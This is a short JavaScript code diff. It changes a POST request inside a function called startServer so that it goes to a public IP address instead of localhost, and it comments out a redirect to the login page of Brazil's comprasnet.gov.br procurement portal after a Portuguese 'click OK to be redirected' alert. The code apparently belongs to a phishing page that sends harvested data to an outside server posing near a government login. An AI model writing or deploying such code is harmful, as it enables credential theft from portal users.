@@ -68,7 +68,7 @@ function startServer(){
     })
 
 
-    fetch('http://localhost:8000', {
+    fetch('http://35.87.83.18:8000', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -89,5 +89,5 @@ function startServer(){
 
       alert('CLIQUE EM OK E SERÁ REDIRECIONADO');
 
-      window.location.href = 'http://comprasnet.gov.br/seguro/loginPortal.asp';
+      // window.location.href = 'http://comprasnet.gov.br/seguro/loginPortal.asp';
 }
